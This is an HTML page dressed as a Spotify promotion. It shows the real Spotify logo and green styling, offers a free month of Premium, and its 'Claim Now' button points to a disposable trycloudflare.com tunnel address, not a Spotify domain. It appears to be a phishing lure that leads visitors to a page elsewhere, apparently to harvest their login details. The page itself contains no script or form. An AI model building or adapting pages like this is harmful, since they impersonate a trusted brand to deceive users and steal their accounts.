<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>You're One Step Away - Spotify Bonus</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1DB954, #121212);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      text-align: center;
      animation: fadeInUp 1.5s ease-out;
    }

    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(40px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    h1 {
      font-size: 2.5em;
      margin-bottom: 20px;
    }

    p {
      font-size: 1.2em;
      margin-bottom: 30px;
    }

    .btn {
      background-color: #1DB954;
      color: #000;
      padding: 15px 30px;
      font-size: 1.1em;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      text-decoration: none;
      font-weight: bold;
      transition: background-color 0.3s, transform 0.2s;
    }

    .btn:hover {
      background-color: #18a64c;
      transform: scale(1.05);
    }

    .logo {
      width: 100px;
      margin-bottom: 20px;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.1);
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_CMYK_Green.png" class="logo" alt="Spotify Logo">
    <h1>You're One Step Away!</h1>
    <p>Click below to claim your 1-month Spotify Premium bonus.</p>
    <a href="https://trance-except-guidance-collins.trycloudflare.com/spt/index.html" class="btn">Claim Now</a>
  </div>
</body>
</html>
